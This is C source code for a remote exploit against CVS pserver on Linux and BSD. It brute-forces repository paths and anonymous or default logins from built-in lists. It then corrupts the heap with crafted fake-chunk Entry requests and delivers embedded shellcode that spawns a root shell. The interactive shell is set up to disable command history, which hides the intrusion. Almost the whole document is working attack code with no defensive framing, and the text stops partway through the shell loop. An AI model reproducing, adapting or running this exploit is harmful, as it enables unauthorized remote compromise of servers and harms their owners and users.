#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdarg.h>
#include <netdb.h>
#include <errno.h>
#include <sys/time.h>
#include <zlib.h>

typedef unsigned char   uchar;

void                    progress(void);
int                     brute_cvsroot(void);
int                     brute_username(void);
int                     brute_password(void);
void                    hdl_crashed(int);
void                    bsd_exploitation(void);
void                    try_exploit(void);
void                    zflush(int);
int                     zprintf(char *, ...);
int                     zgetch(void);
void                    start_gzip(void);
void                    fill_holes(void);
char                    * zgets(void);
void                    evil_entry(void);
void                    linux_exploitation(ulong, int);
void                    do_dicotomie(void);
void                    do_xploit(void);
char                    * flush_sock(void);
void                    usage(char *);
long                    getip(char *);
void                    try_oneshoot(void);
int                     connect_to_host(char *, int);
int                     write_sock(void *, int);
int                     read_sock(void *, int);
void                    nopen(char *, int);
char                    * ngets(void);
void                    memcpy_flush(void);
void                    cvs_conn(void);
int                     detect_remote_os(void);
void                    memcpy_remote(ulong, ulong, uchar *, int);
void                    memcpy_addr(ulong, ulong, int);
void                    nclose(void);
char                    * scramble(char *);
int                     sh(int);

struct array
{
    char        * name;
    int         id;
};

struct array CVSROOTS[]=
{
    {   "/cvs"                  ,       -1      },
    {   "/cvsroot"              ,       -1      },
    {   "/var/cvs"              ,       -1      },
    {   "/anoncvs"              ,       -1      },
    {   "/repository"           ,       -1      },
    {   "/home/CVS"             ,       -1      },
    {   "/home/cvspublic"       ,       -1      },
    {   "/home/cvsroot"         ,       -1      },
    {   "/var/lib/cvs"          ,       -1      },
    {   "/var/cvsroot"          ,       -1      },
    {   "/usr/lib/cvs"          ,       -1      },
    {   "/usr/CVSroot"          ,       -1      },
    {   "/usr/share/cvsroot"    ,       -1      },
    {   "/usr/local/cvsroot"    ,       -1      },
    {   "/usr/local/cvs"        ,       -1      },
    {   "/webcvs"               ,       -1      },
    {   NULL                    ,       -1      },
};

struct array USERNAMES[]=
{
    {   "anonymous"     ,       -1      },
    {   "anoncvs"       ,       -1      },
    {   "cvsread"       ,       -1      },
    {   "anon"          ,       -1      },
    {   "cvs"           ,       -1      },
    {   "guest"         ,       -1      },
    {   "reader"        ,       -1      },
    {   "cvslogin"      ,       -1      },
    {   "anon-cvs"      ,       -1      },
    {   NULL            ,       -1      },
};

struct array PASSWORDS[]=
{
    {   ""              ,       -1      },
    {   " "             ,       -1      },
    {   "anonymous"     ,       -1      },
    {   "anoncvs"       ,       -1      },
    {   "anon"          ,       -1      },
    {   "cvs"           ,       -1      },
    {   "guest"         ,       -1      },
    {   NULL            ,       -1      },
};

#define HIGH_STACK      0xbfffffc0
#define LOWER_STACK     0xbfffd000
#define DEFAULT_ADDR    0xbffffd00
#define RANGE_VALID     0xbffffe00
#define DUMMY_ADDR      0x42424242
#define LINUX_ADDR      0xbfffe200
#define LINUX_SIZE      0x2000
#define HEAPBASE        0x082c512e

#define DEFAULT_TIMEOUT 20
#define TIMEOUT         DEFAULT_TIMEOUT
#define CMD             "export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:" \
                        "/usr/local/bin:/usr/local/sbin;alias ls='ls --color';"\
                        "unset HISTFILE;ABrox=`pwd`;cd /;echo RM -RF $ABrox;"\
                        "echo ---YOU ARE IN BRO : `hostname`---\nw;alias c=clear\n"
#define VERT            "\033[32m"
#define NORM            "\033[0m"
#define INFO            ""
#define BAD_TRIP        "WRONG !\n"
#define GOOD_TRIP       VERT"FOUND"NORM" !\n"
#define QUIT(x...)      { printf(x); exit(0); }
#ifdef  DEBUGMSG
#define DEBUG(x...)     fprintf(stderr, x)
#else
#define DEBUG(x...)
#endif
#define info(fmt...)    fprintf(stderr, INFO""fmt)
#define aff(fmt...)     fprintf(stderr, fmt)
static char             tmpbuf[32000];
#define nprintf(fmt...) { snprintf(tmpbuf, sizeof(tmpbuf), fmt); \
                        write_sock(tmpbuf, strlen(tmpbuf)); }
#define nwrite(buf, cn) write_sock(sock, buf, cn)
#define nread(buf, cn)  read_sock(sock, buf, cn)
#define NHOLES          (256 - 31)
#define SCNUM           128
#define SCSIZE          32766
#define OFFSET          106
#define ALIGN(x, y)     ((x % y) ? x + (x % y) : x)
#define SET_FD(x)       (x - CHUNK_BK)
#define SET_BK(x)       (x - CHUNK_FD)
#define UNSET_BK(x)     (x + CHUNK_FD)
#define UNSET_FD(x)     (x + CHUNK_BK)
#define MAX_FILL_HEAP   200
#define NUM_OFF7        (sizeof("Entry "))
#define MSIZE           0x4c
#define MALLOC_CHUNKSZ  8
#define AN_ENTRYSZ      8
#define MAGICSZ         ((MALLOC_CHUNKSZ * 2) + AN_ENTRYSZ)
#define FAKECHUNK       MSIZE - MAGICSZ + (NUM_OFF7 - 1)
#define SIZEBUF         FAKECHUNK + 16
#define SIZE_VALUE      -8
#define CHUNK_PSIZE     0
#define CHUNK_SIZE      4
#define CHUNK_FD        8
#define CHUNK_BK        12
#define OVERFLOW_NUM    8
#define DEFAULT_SIZE    0x300
#define SHELLCODE_OFF   0x142
#define SHELLCODE_ADDR  (addr - SHELLCODE_OFF)
#define DUMMY2          "timetosleep"
#define DUMMY           "theosuxdick"
#define MAGICSTRING     "abroxyou"
#define ABMAGIC         "-AB-"
#define ABMAGICSZ       sizeof(ABMAGIC) - 1
#define EXPLOITROX      "\t@#!@"VERT"SUCCESS"NORM"#@!#\n\n"
#define PCNT            20
#define CVS_PORT        2401
#define CVS_LOGIN       "BEGIN AUTH REQUEST\n%s\n%s\n%s\n"\
                        "END AUTH REQUEST\n"
#define CVS_VERIF       "BEGIN VERIFICATION REQUEST\n%s\n%s\n%s\n"\
                        "END VERIFICATION REQUEST\n"
#define CVS_SEND_ROOT   "Root %s\n"
#define CVS_GET_VERSION "version\n"
#define CVS_FLUSH       "\nnoop\nnoop\n"
#define CVS_AUTH_FAILED "I HATE YOU"
#define CVS_AUTH_SUCCESS        "I LOVE YOU"
#define CVS_BAD_REP     "no such repository"
#define CVS_NO_USER     "no such user"
#define CVSENTRY        "Entry "
#define CVS_ISMOD       "Is-modified "
#define CVS_ISMODSZ     sizeof(CVS_ISMOD) - 1
#define CVS_UNKNOW      "unrecognized request"
#define CVS_ERROR       "error"
#define CVS_ERROR2      "E "
#define CVS_GZIP        "Gzip-stream "
#define CVS_OK          "ok"
#define BANNER          VERT"Ac1dB1tCh3z "NORM"(C)VS linux/*BSD pserver\n"
#define ERR_CVSROOT     "unable to found a valid cvsroot\n"
#define ERR_USERNAME    "unable to found a valid username\n"
#define ERR_PASSWORD    "unable to found a valid password\n"
#define ERR_FAILURE     "Is remote really linux/bsd without security patch ?\n"
#define ERR_AUTHFAILED  "Fatal: authentification failure..\n"
#define ERR_ZPRINTF     "Too long zprintf (something is broken) !\n"
#define ERR_INFLATE     "Inflate error\n"
#define ERR_CONN        "cannot connect\n"
#define ERR_GETIP       "cannot resolve\n"
#define ERR_READSOCK    "cannot read data\n"
#define ERR_WRITESOCK   "cannot write data\n"
#define SUCCESS_LOGON   VERT"Ok"NORM", we log in (user:%s, pass:%s, cvsroot:%s)"
#define bad_addr(x)     (((x >> 8)&0xFF) == '\n' || ((x >> 8)&0xFF)=='\0'\
                        || (x & 0xFF) == '\n' || (x & 0xFF) == '\0' || \
                        (x & 0xFF) == '/' || ((x >> 8) & 0xFF) == '/' || \
                        (x & 0xFF) == '\012' || ((x >> 8) & 0xFF) == '\012')
/* 0h j3sus */
char                    zbuf[65536 * 4];
int                     zbufpos;
int                     cur_num         = 0;
int                     is_scramble     = 0;
int                     detectos        = 0;
int                     sock            = 0;
int                     port            = CVS_PORT;
ulong                   saddr           = DEFAULT_ADDR;
uint                    size            = DEFAULT_SIZE;
int                     timeout         = DEFAULT_TIMEOUT;
int                     scnum           = SCNUM;
ulong                   heapbase        = HEAPBASE;
int                     isbsd           = 0;
int                     usent           = 0;
int                     zsent           = 0;
char                    *root          = NULL;
char                    *user          = NULL;
char                    *pass          = NULL;
char                    *host          = NULL;
z_stream                zout;
z_stream                zin;
/*
** write(1, "abroxyou", 8) / setuid(0) / execve / exit;
** Linux only
*/
uchar                   ab_shellcode[] =
"\xeb\x15\x42\x4c\x34\x43\x4b\x48\x34\x37\x20\x34\x20\x4c\x31\x46\x33"
"\x20\x42\x52\x4f\x21\x0a\x31\xc0\x50\x68\x78\x79\x6f\x75\x68\x61\x62"
"\x72\x6f\x89\xe1\x6a\x08\x5a\x31\xdb\x43\x6a\x04\x58\xcd\x80\x6a\x17"
"\x58\x31\xdb\xcd\x80\x31\xd2\x52\x68\x2e\x2e\x72\x67\x58\x05\x01\x01"
"\x01\x01\x50\xeb\x12\x4c\x45\x20\x54\x52\x55\x43\x20\x43\x48\x45\x4c"
"\x4f\x55\x20\x49\x43\x49\x68\x2e\x62\x69\x6e\x58\x40\x50\x89\xe3\x52"
"\x54\x54\x59\x6a\x0b\x58\xcd\x80\x31\xc0\x40\xcd\x80";
/*
** setuid(geteuid()) / write(1, "-AB-", 4) / dup2 / execve
** Linux/BSD
*/
uchar                   xx_shellcode[] =
"\x6a\x1b\x58\x31\xdb\xcd\x80\x85\xc0\x74\x42\x6a\x19\x58"
"\x50\xcd\x80\x50\x6a\x17\x58\x50\xcd\x80\x68\x2d\x41\x42"
"\x2d\x89\xe3\x6a\x04\x58\x50\x53\x6a\x01\x50\xcd\x80\x6a"
"\x02\x6a\x01\x50\xb0\x5a\xcd\x80\x31\xc0\x50\x68\x6e\x2f"
"\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x50"
"\x51\x53\x50\xb0\x3b\xcd\x80\x6a\x31\x58\xcd\x80\x93\x6a"
"\x17\x58\xcd\x80\x6a\x04\x58\x6a\x01\x5b\x68\x2d\x41\x42"
"\x2d\x89\xe1\x89\xc2\xcd\x80\xb0\x3f\x6a\x01\x5b\x6a\x02"
"\x59\xcd\x80\x31\xc0\x99\x50\x68\x6e\x2f\x73\x68\x68\x2f"
"\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x00";

void                    usage(char * base)
{
    printf("Us4g3 : r34d 7h3 c0d3 d00d ;P\n");
    exit(0);
}

int                     main(int ac, char **av)
{
    int                 c;

    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    printf(BANNER);
    while ((c = getopt(ac, av, "r:u:p:h:P:s:S:t:iRbo:n:")) != EOF)
        {
            switch(c)
                {
                case 'b':
                    isbsd++;
                    break;
                case 'R':
                    detectos++;
                    break;
                case 'r':
                    root = strdup(optarg);
                    break;
                case 'i':
                    is_scramble = 1;
                    break;
                case 's':
                    saddr = strtoul(optarg, 0, 0);
                    break;
                case 't':
                    timeout = strtoul(optarg, 0, 0);
                    break;
                case 'S':
                    size = strtoul(optarg, 0, 0);
                    break;
                case 'u':
                    user = strdup(optarg);
                    break;
                case 'p':
                    pass = strdup(optarg);
                    break;
                case 'h':
                    host = strdup(optarg);
                    break;
                case 'P':
                    port = strtoul(optarg, 0, 0);
                    break;
                case 'o':
                    heapbase = strtoul(optarg, 0, 0);
                    break;
                case 'n':
                    scnum = strtoul(optarg, 0, 0);
                    break;
                default:
                    usage(av[0]);
                }
        }
    if (!host || (detectos && isbsd))
        usage(av[0]);
    if (!root)
        if(!brute_cvsroot())
            QUIT(ERR_CVSROOT);
    if (!user)
        if(!brute_username())
            QUIT(ERR_USERNAME);
    if (!pass)
        if(!brute_password())
            QUIT(ERR_PASSWORD);
    do_xploit();
    return (0);
}

void                    do_xploit(void)
{
    int                 linux_only = 0;

    signal(SIGPIPE, hdl_crashed);
    if (detectos)
        linux_only = detect_remote_os();
    if (isbsd)
        bsd_exploitation();
    else
        {
            linux_exploitation(LINUX_ADDR, LINUX_SIZE);
            if (!linux_only)
                bsd_exploitation();
        }
    printf(ERR_FAILURE);
    return;
}

int                     detect_remote_os(void)
{
    info("Guessing if remote is a cvs on a linux/x86...\t");
    if(range_crashed(0xbfffffd0, 0xbfffffd0 + 4) ||
       !range_crashed(0x42424242, 0x42424242 + 4))
        {
            printf(VERT"NO"NORM", assuming it's *BSD\n");
            isbsd = 1;
            return (0);
        }
    printf(VERT"Yes"NORM" !\n");
    return (1);
}

void                    bsd_exploitation(void)
{
    printf("Exploiting %s on a *BSD\t", host);
    do_auth();
    fill_holes();
    evil_entry();
    start_gzip();
    try_exploit();
}

void                    linux_exploitation(ulong addr, int sz)
{
    char                * buf;

    printf("Exploiting %s on a Linux\t", host);
    cvs_conn();
    fflush(stdout);
    memcpy_addr(addr, SHELLCODE_ADDR, sz);
    memcpy_remote(RANGE_VALID, SHELLCODE_ADDR, ab_shellcode,
                  sizeof(ab_shellcode) - 1);
    memcpy_flush();
    nprintf(CVS_FLUSH);
    buf = flush_sock();
    if (strstr(buf, MAGICSTRING))
        {
            printf(EXPLOITROX);
            sh(sock);
        }
#ifdef SHITTEST
    sleep(333);
#endif
    nclose();
    info(BAD_TRIP);
}

int                     do_auth(void)
{
    char                * your_mind;

    nopen(host, port);
    nprintf(CVS_LOGIN, root, user, scramble(pass));
    your_mind = flush_sock();
    if (!strstr(your_mind, CVS_AUTH_SUCCESS))
        QUIT(ERR_AUTHFAILED);
    free(your_mind);
    nprintf(CVS_SEND_ROOT, root);
}

void                    fill_heap(void)
{
    int                 c;

    for (c = 0; c != MAX_FILL_HEAP; c++)
        nprintf(CVSENTRY"CCCCCCCCC/CCCCCCCCCCCCCCCCCCCCCCCCCC"
                "CCCCCCCCCCCCCCCCCCCCC/CCCCCCCCCCC\n");
    for (c = 0; c != (MAX_FILL_HEAP * 2); c++)
        nprintf(CVSENTRY"CC/CC/CC\n");
}

void                    cvs_conn(void)
{
    do_auth();
    fill_heap();
}

char                    * get_dummy(void)
{
    static char         buf[2048] = { '\0' };

    memset(buf, '\0', sizeof(buf));
    sprintf(buf, CVSENTRY"B%s/", DUMMY2);
    memset(buf + strlen(buf), 'B', SIZEBUF - strlen(DUMMY2));
    strcat(buf, "/\n");
    return (&buf[0]);
}

char                    * build_chunk(ulong addr1, ulong addr2, int i)
{
    char                num[20];
    char                * buf = get_dummy();

    if (i != -1)
        {
            sprintf(num, "%d", i);
            memcpy(buf + NUM_OFF7, num, strlen(num));
        }
    *(int *) (buf + FAKECHUNK + CHUNK_SIZE) = SIZE_VALUE;
    *(int *) (buf + FAKECHUNK + CHUNK_FD) = SET_FD(addr1);
    *(int *) (buf + FAKECHUNK + CHUNK_BK) = SET_BK(addr2);
    return (buf);
}

void                    memcpy_flush(void)
{
    int                 i = 0, j;
    char                * buf;
    char                num[20];

    if (!cur_num)
        return;
    buf = get_dummy();
    for (i = 0; i != cur_num - 1; i++)
        {
            sprintf(buf, CVS_ISMOD"%s\n", DUMMY2);
            sprintf(num, "%d", i);
            memcpy(buf + CVS_ISMODSZ, num, strlen(num));
            for (j = 0; j != OVERFLOW_NUM; j++)
                nprintf(buf);
        }
    return;
}

void                    memcpy_remote(ulong range, ulong addr, uchar * buf,
                                      int sz)
{
    int                 i;

    if (sz <= 0)
        return ;
    if (!cur_num)
        nprintf(build_chunk(DUMMY_ADDR, DUMMY_ADDR, cur_num++));
    for (i = sz - 1, addr += (sz - 1); i >= 0; i--, addr--)
        {
            range &= 0xFFFFFF00;
            range += buf[i];
            if (!bad_addr(SET_FD(addr)) && !bad_addr(range))
                nprintf(build_chunk(addr, UNSET_BK(range), cur_num++));
        }
    return;
}

void                    memcpy_addr(ulong eipaddr, ulong shelladdr, int sz)
{
    int                 aff = (sz / 4) / PCNT, j;

    if (!cur_num)
        nprintf(build_chunk(DUMMY_ADDR, DUMMY_ADDR, cur_num++));
    putchar('[');
    for (j = 0; j != PCNT; j++)
        putchar(' ');
    putchar(']');
    for (j = 0; j != PCNT + 1; j++)
        putchar('\b');
    fflush(stdout);
    for (j = 0; sz >= 0 && eipaddr <= HIGH_STACK; sz -= 4, eipaddr += 4, j++)
        {
            if (j == aff)
                {
                    putchar('#');
                    fflush(stdout);
                    j = 0;
                }
            if (!bad_addr(SET_FD(eipaddr)) && !bad_addr(shelladdr))
                nprintf(build_chunk(eipaddr, UNSET_BK(shelladdr), cur_num++));
        }
    printf("#\t");
    fflush(stdout);
    return;
}

int                     range_crashed(int addr, int addr2)
{
    char                * buf;

    cvs_conn();
    nprintf(build_chunk(DUMMY_ADDR, DUMMY_ADDR, cur_num++));
    for (; addr < addr2; addr += 8)
        if (!bad_addr(SET_FD(addr)) && !bad_addr(SET_BK(addr + 4)))
            nprintf(build_chunk(addr, addr + 4, cur_num++));
    memcpy_flush();
    nprintf(CVS_FLUSH);
    buf = flush_sock();
    if (strstr(buf, CVS_OK) || strstr(buf, CVS_UNKNOW)
        || strstr(buf, CVS_ERROR) || strstr(buf, CVS_ERROR2))
        {
            nclose();
            return (0);
        }
#ifdef SHITTEST
    sleep(333);
#endif
    nclose();
    return (1);
}

void                    zflush(int finish)
{
    static char         outbuf[65536];

    zout.next_in = zbuf;
    zout.avail_in = zbufpos;
    do {
        zout.next_out = outbuf;
        zout.avail_out = sizeof(outbuf);
        if (deflate(&zout, finish ? Z_FINISH : Z_PARTIAL_FLUSH) == -1)
            QUIT("zflush : deflate failed !\n");
        zsent += sizeof(outbuf) - zout.avail_out;
        write_sock(outbuf, sizeof(outbuf) - zout.avail_out);
    } while (zout.avail_out == 0 && zout.avail_in != 0);
    zbufpos = 0;
    return;
}

int                     zprintf(char *fmt, ...)
{
    static char         buf[65536];
    int                 len;
    va_list             ap;

    va_start(ap, fmt);
    len = vsnprintf(buf, sizeof(buf) - 1, fmt, ap);
    usent += len;
    if ((sizeof(zbuf) - zbufpos) < (len))
        zflush(0);
    memcpy(zbuf + zbufpos, buf, len);
    zbufpos += len;
    if (zbufpos >= sizeof(zbuf))
        QUIT(ERR_ZPRINTF);
    return (len);
}

int                     zgetch(void)
{
    static char         * outbuf = NULL;
    static int          outpos = 0, outlen = 0;
    static char         rcvbuf[32768];
    static char         dbuf[4096];
    int                 got;

  retry:
    if (outpos < outlen && outlen)
        return outbuf[outpos++];
    free(outbuf);
    outlen = 0;
    outbuf = NULL;
    got = read_sock(rcvbuf, sizeof(rcvbuf));
    if (got <= 0)
        QUIT(ERR_READSOCK);
    zin.next_in = rcvbuf;
    zin.avail_in = got;
    while (1)
        {
            int status, dlen;

            zin.next_out = dbuf;
            zin.avail_out = sizeof(dbuf);
            status = inflate(&zin, Z_PARTIAL_FLUSH);
            switch (status)
                {
                case Z_OK:
                    outpos = 0;
                    dlen = sizeof(dbuf) - zin.avail_out;
                    outlen += dlen;
                    outbuf = realloc(outbuf, outlen);
                    memcpy(outbuf + outlen - dlen, dbuf, dlen);
                    break;
                case Z_BUF_ERROR:
                    goto retry;
                default:
                    QUIT(ERR_INFLATE);
                }
        }
}

char                    * zgets(void)
{
    static char         buf[32768];
    char                * p = buf;
    int                 c;

    while (1)
        {
            c = zgetch();
            if (c == '\n')
                break;
            *p++ = c;
            if (p > buf + sizeof(buf))
                {
                    p--;
                    break;
                }
        }
    *p = 0;
    return (buf);
}

void                    start_gzip(void)
{
    nprintf(CVS_GZIP"1\n");
    deflateInit(&zout, 9);
    inflateInit(&zin);
    return;
}

void                    fill_holes(void)
{
    int i, j;

    for (i = 0; i < 10; i++)
        nprintf(CVSENTRY"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n");
    for (i = 0; i < 10; i++)
        nprintf(CVSENTRY"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n");
    for (i = 0; i < NHOLES; i++)
        {
            nprintf(CVSENTRY"ac1db1tch3z/blackhat4life/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n");
            for (j = 0; j < 5; j++)
                nprintf(CVSENTRY"%.*X\n", j * 8 - 2, 11);
        }
    nprintf("Set x=%472X\n", 10);
    return;
}

void                    evil_entry(void)
{
    int                 i;
    ulong               heap = heapbase;

    nprintf("Set x=\n");
    nprintf(CVSENTRY"/AB/AA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
            "%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c\n",
            heap & 0xff, (heap >> 8) & 0xff, (heap >> 16) & 0xff, (heap >> 24),
            heap & 0xff, (heap >> 8) & 0xff, (heap >> 16) & 0xff, (heap >> 24),
            heap & 0xff, (heap >> 8) & 0xff, (heap >> 16) & 0xff, (heap >> 24),
            heap & 0xff, (heap >> 8) & 0xff, (heap >> 16) & 0xff, (heap >> 24));
}

void                    try_exploit(void)
{
    time_t              last, now;
    int                 i, j, len, o;
    static char         sc[SCSIZE+1];

    for (i = 0; i < OFFSET; i++)
        zprintf(CVS_ISMOD"AB\n");
    printf("[", SCSIZE * scnum / 1024);
    for (i = 0; i < PCNT; i++)
        putchar(' ');
    printf("]");
    for (i = 0; i < PCNT + 1; i++)
        printf("\b");
    memset(sc, 'A', SCSIZE);
    memcpy(sc + SCSIZE - sizeof(xx_shellcode), xx_shellcode,
           sizeof(xx_shellcode));
    sc[SCSIZE] = 0;
    last = o = 0;
    for (i = 0; i < scnum; i++)
        {
            now = time(NULL);
            if (now > last || (i + 1 == scnum))
                {
                    last = now;
                    for (j = 0; j < o; j++)
                        printf("\b");
                    for (j = 0; j < (o = ((i+1) * PCNT / scnum)); j++)
                        printf("#");
                }
            zprintf(CVSENTRY"%s\n", sc);
        }
    printf("] ");
    zflush(0);
    zflush(1);
    len = read_sock(sc, sizeof(sc));
    for (i = 0; i < len; i++)
        if (!memcmp(sc + i, ABMAGIC, ABMAGICSZ))
            {
                printf(EXPLOITROX);
                sh(sock);
            }
    printf(BAD_TRIP);
}

int                     brute_cvsroot(void)
{
    int                 i, ret = 0;
    char                * rbuf;

    info("Bruteforcing cvsroot...\n");
    for (i = 0; CVSROOTS[i].name; i++)
        {
            nopen(host, port);
            nprintf(CVS_VERIF, CVSROOTS[i].name, DUMMY, scramble(DUMMY));
            info("Trying CVSROOT = %s\t", CVSROOTS[i].name);
            rbuf = flush_sock();
            nclose();
            if (!rbuf || strstr(rbuf, CVS_BAD_REP))
                info(BAD_TRIP);
            else if (strstr(rbuf, CVS_AUTH_FAILED) ||
                     strstr(rbuf, CVS_AUTH_SUCCESS) ||
                     strstr(rbuf, CVS_NO_USER))
                {
                    info(GOOD_TRIP);
                    CVSROOTS[i].id = i;
                    root = CVSROOTS[i].name;
                    if (user && pass)
                        {
                            free(rbuf);
                            return (1);
                        }
                    ret++;
                }
            else
                printf(BAD_TRIP);
            free(rbuf);
        }
    return (ret);
}

int                     brute_username(void)
{
    int                 i, c, ret = 0;
    char                * rbuf;

    info("Bruteforcing cvs login... \n");
    for (c = 0; CVSROOTS[c].name; c++)
        {
            if (!root && CVSROOTS[c].id == -1) continue;
            for ( i=0; USERNAMES[i].name; i++ )
                {
                    if (root)
                        CVSROOTS[c].name = root;
                    info("Trying cvsroot = %s, login = %s\t", CVSROOTS[c].name,
                         USERNAMES[i].name);
                    nopen(host, port);
                    nprintf(CVS_VERIF, CVSROOTS[c].name, USERNAMES[i].name,
                            scramble(DUMMY));
                    rbuf = flush_sock();
                    nclose();
                    if ( strstr( rbuf, CVS_NO_USER))
                        info( BAD_TRIP, rbuf );
                    else if (strstr( rbuf, CVS_AUTH_FAILED) ||
                        strstr(rbuf, CVS_AUTH_SUCCESS))
                        {
                            info(GOOD_TRIP);
                            USERNAMES[i].id = CVSROOTS[c].id;
                            user = USERNAMES[i].name;
                            if (pass)
                                {
                                    free(rbuf);
                                    return (1);
                                }
                            ret++;
                        }
                    free(rbuf);
                }
            if (root)
                return (ret);
        }
    return (ret);
}

int                     brute_password(void)
{
    int                 i, c, ret=0;
    char                * rbuf;

    info("Bruteforcing cvs password...\n");
    for (c = 0; USERNAMES[c].name; c++)
        {
            if (!user && USERNAMES[c].id == -1) continue;
            for (i = 0; PASSWORDS[i].name; i++)
                {
                    info("Trying login = %s, pass = %s\t", user?user:USERNAMES[c].name,
                         PASSWORDS[i].name);
                    nopen(host, port);
                    nprintf(CVS_VERIF,root?root:CVSROOTS[USERNAMES[c].id].name,
                            user?user:USERNAMES[c].name, scramble(PASSWORDS[i].name) );
                    rbuf = flush_sock();
                    nclose();
                    if (strstr(rbuf, CVS_AUTH_FAILED))
                        info(BAD_TRIP, rbuf);
                    else if (strstr(rbuf, CVS_AUTH_SUCCESS))
                        {
                            info(GOOD_TRIP);
                            if (!root)
                                root = CVSROOTS[ USERNAMES[c].id ].name;
                            if (!user)
                                user = USERNAMES[c].name;
                            pass = PASSWORDS[i].name;
                            free(rbuf);
                            printf(SUCCESS_LOGON, user, pass, root);
                            return (1);
                        }
                    else
                        info(BAD_TRIP);
                    free(rbuf);
                }
            if (user)
                return (0);
        }
    return (0);
}

void                    hdl_crashed(int signum)
{
    return;
}

int                     write_sock(void * buf, int sz)
{
    fd_set              wfds;
    struct timeval      tv;
    int                 ret;

    if (sz <= 0)
        return (sz);
    FD_ZERO(&wfds);
    FD_SET(sock, &wfds);
    bzero(&tv, sizeof (tv));
    tv.tv_sec = timeout;
    tv.tv_usec = 0;
    while (select(sock + 1, NULL, &wfds, NULL, &tv) <= 0)
        {
            FD_ZERO(&wfds);
            FD_SET(sock, &wfds);
            tv.tv_sec = timeout;
            tv.tv_usec = 0;
        }
    if ((ret = write(sock, buf, sz)) != sz)
        QUIT(ERR_WRITESOCK);
    return (ret);
}

int                     read_sock(void * buf, int sz)
{
    fd_set              rd;
    struct timeval      tv;
    int                 ret;

    FD_ZERO(&rd);
    FD_SET(sock, &rd);
    bzero(&tv, sizeof (tv));
    tv.tv_sec = timeout;
    tv.tv_usec = ret = 0;
    if (select(sock + 1, &rd, NULL, NULL, &tv) <= 0)
        QUIT(ERR_READSOCK);
    if ((ret = read(sock, buf, sz)) <= 0)
    return (ret);
}

char                    * flush_sock(void)
{
    char        * ret;
    int         len, y, i = 0;
    fd_set              rfds;
    struct timeval      tv;

    FD_ZERO(&rfds);
    FD_SET(sock, &rfds);
    bzero(&tv, sizeof (tv));
    tv.tv_sec = timeout;
    tv.tv_usec = 0;
#define BUF_SIZE        42
    ret = malloc((len = BUF_SIZE));
    if (select(sock + 1, &rfds, NULL, NULL, &tv) < 0)
        return ("");
    while ((y = read(sock, ret + i, BUF_SIZE)) > 0)
        {
            i += y;
            ret = realloc(ret, (len += BUF_SIZE));
        }
    if (i == len)
        realloc(ret, len + 1);
    ret[i] = 0;
    return (ret);
}

long                    getip(char * hostname)
{
    struct hostent * p_hostent;
    long ipaddr;

    ipaddr = inet_addr( hostname );
    if (ipaddr  < 0)
        {
            p_hostent = gethostbyname(hostname);
            if (p_hostent == NULL)
                QUIT(ERR_GETIP);
            memcpy( &ipaddr, p_hostent->h_addr, p_hostent->h_length );
        }
    return(ipaddr);
}

int                     connect_to_host(char * host, int port)
{
    struct sockaddr_in  s_in;

    memset( &s_in, '\0', sizeof(struct sockaddr_in) );
    s_in.sin_family = AF_INET;
    s_in.sin_addr.s_addr = getip( host );
    s_in.sin_port = htons( port );
    if ((sock = socket( AF_INET, SOCK_STREAM, 0 )) <= 0)
        QUIT(ERR_CONN);
    if (connect(sock, (struct sockaddr *)&s_in, sizeof(s_in)))
        QUIT (ERR_CONN);
#ifdef  SHITTEST
            sleep(15);
#endif
    fcntl(sock, F_SETFL, O_NONBLOCK);
    return (sock);
}

void                    nopen(char * host, int port)
{
    connect_to_host(host, port);
    cur_num = 0;
    return;
}

void                    nclose(void)
{
    cur_num = 0;
    close(sock);
    return;
}

unsigned char shifts[] = {
   0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, 15,
  16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31,
 114,120, 53, 79, 96,109, 72,108, 70, 64, 76, 67,116, 74, 68, 87,
 111, 52, 75,119, 49, 34, 82, 81, 95, 65,112, 86,118,110,122,105,
  41, 57, 83, 43, 46,102, 40, 89, 38,103, 45, 50, 42,123, 91, 35,
 125, 55, 54, 66,124,126, 59, 47, 92, 71,115, 78, 88,107,106, 56,
  36,121,117,104,101,100, 69, 73, 99, 63, 94, 93, 39, 37, 61, 48,
  58,113, 32, 90, 44, 98, 60, 51, 33, 97, 62, 77, 84, 80, 85,223,
 225,216,187,166,229,189,222,188,141,249,148,200,184,136,248,190,
 199,170,181,204,138,232,218,183,255,234,220,247,213,203,226,193,
 174,172,228,252,217,201,131,230,197,211,145,238,161,179,160,212,
 207,221,254,173,202,146,224,151,140,196,205,130,135,133,143,246,
 192,159,244,239,185,168,215,144,139,165,180,157,147,186,214,176,
 227,231,219,169,175,156,206,198,129,164,150,210,154,177,134,127,
 182,128,158,208,162,132,167,209,149,241,153,251,237,236,171,195,
 243,233,253,240,194,250,191,155,142,137,245,235,163,242,178,152 };

char                    * scramble(char * str)
{
    int                 i;
    char                * s;

    if (is_scramble)
        return (str);
    s = (char *) malloc (strlen (str) + 3);
    memset(s, '\0', strlen(str) + 3);
    *s = 'A';
    for (i = 1; str[i - 1]; i++)
        s[i] = shifts[(unsigned char)(str[i - 1])];
    return (s);
}

int                     sh(int sockfd)
{
    int                 cnt;
    char                buf[1024];
    fd_set              fds;

    write(sockfd, CMD, strlen(CMD));
    while(1)
        {
            FD_ZERO(&fds);
            FD_SET(0, &fds);
            FD_SET(sockfd, &fds);
            if(select(FD_SETSIZE, &fds, NULL, NULL, NULL))
                {
                    if(FD_ISSET(0, &fds))
                        {
                            if((cnt = read(0, buf, 1024)) < 1)
                                {
                                    if(errno == EWOULDBLOCK || errno == EAGAIN)
                                        continue;
                                    else
                                        break;
                                }
                            write(sockfd, buf, cnt);
                        }
